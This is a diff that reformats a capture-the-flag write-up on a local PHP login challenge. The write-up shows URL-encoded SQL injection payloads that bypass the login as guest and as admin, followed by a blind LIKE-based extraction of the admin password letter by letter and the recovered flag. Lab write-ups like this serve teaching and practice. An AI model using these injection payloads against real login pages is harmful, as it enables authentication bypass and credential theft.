@@ -47,26 +47,20 @@ FLUSH PRIVILEGES;
 
 EXIT;
 
-made a new directory and copied the sample.php file into it. Then started the php server.
+- made a new directory and copied the sample.php file into it. Then started the php server.
 php -S 127.0.0.1:8000
-then open a new terminal and opened the challenge page in a browser. http://127.0.0.1:8000/sample.php
-then I checked if the injection exist by adding "%27||1=1%23" to the end of this website.
-http://127.0.0.1:8000/sample.php?pw=%27||1=1%23
-this showed the login as guest
-http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%23
-this would login as admin. so now i know that injection works.
-now check if the password character starts with a letter using like.
-tried 'a'--> http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26pw%20like%20%27a%25%27%23
-showed the user as guest
-then tried with different variables.
-http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20like%20%27S%25%27%23
-then got the first letter as S
-now try the second letter.
-http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20like%20%27SU%25%27%23
-got the letter U
-continue for the full password: SUPERSECRET,
-http://127.0.0.1:8000/sample.php?pw=supersecret
-then this will appear
-CHALLENGE CLEARED!! Hello admin !!
+- then open a new terminal and opened the challenge page in a browser. http://127.0.0.1:8000/sample.php
+- then I checked if the injection exist by adding "%27||1=1%23" to the end of this website. http://127.0.0.1:8000/sample.php?pw=%27||1=1%23
+- this showed the login as guest http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%23
+- this would login as admin. so now i know that injection works.
+- now check if the password character starts with a letter using like.
+- tried 'a'--> http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26pw%20like%20%27a%25%27%23
+- showed the user as guest
+- then tried with different variables.
+- then got the first letter as S. http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20like%20%27S%25%27%23
+- now try the second letter.
+- got the letter U. http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20like%20%27SU%25%27%23
+- continue for the full password: SUPERSECRET. http://127.0.0.1:8000/sample.php?pw=supersecret
+- then this will appear. CHALLENGE CLEARED!! Hello admin !!
 
 Flag: flag{supersecret}
